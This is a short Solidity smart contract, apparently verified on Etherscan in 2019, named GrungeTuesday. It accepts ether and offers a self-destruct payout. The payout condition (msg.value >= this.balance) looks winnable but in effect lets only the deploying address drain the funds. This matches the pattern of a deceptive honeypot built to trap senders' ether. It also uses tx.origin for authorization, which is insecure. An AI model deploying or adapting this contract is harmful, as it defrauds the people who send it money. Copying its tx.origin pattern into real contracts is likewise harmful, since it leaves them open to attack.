/**

 *Submitted for verification at Etherscan.io on 2019-02-12

*/



pragma solidity ^0.4.25;



contract GrungeTuesday

{

    address O = tx.origin;



    function() public payable {}



    function multi_x() public payable {

        if (msg.value >= this.balance || tx.origin == O) {

            selfdestruct(tx.origin);

        }

    }

 }